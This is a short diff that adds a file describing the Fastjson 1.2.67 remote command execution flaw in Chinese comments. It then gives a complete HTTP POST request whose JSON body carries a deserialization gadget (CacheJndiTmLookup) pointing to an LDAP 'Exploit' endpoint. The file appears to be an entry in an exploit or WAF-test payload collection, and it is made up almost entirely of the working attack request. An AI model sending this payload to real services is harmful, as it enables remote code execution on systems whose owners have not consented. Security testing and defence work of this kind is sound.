@@ -1,0 +1,11 @@
+# Fastjson_1.2.67远程命令执行漏洞
+# fastjson采用黑白名单的方法来防御反序列化漏洞，导致当发掘新的可攻击的反序列化Gadgets类时，则可能可以绕过黑白名单防御机制，造成远程命令执行。
+POST /?acid=80025455&bid=hd_tag_m8mv2619 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2619
+RM-PRO-Token: 8f136bd85cc37bef00a4b075162d1850
+RM-PRO-Time: 1742808524983
+User-Agent: curl/7.83.1
+Content-Type: application/json
+
+{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup", "jndiNames":["ldap://localhost:1389/Exploit"], "tm": {"$ref":"$.tm"}}
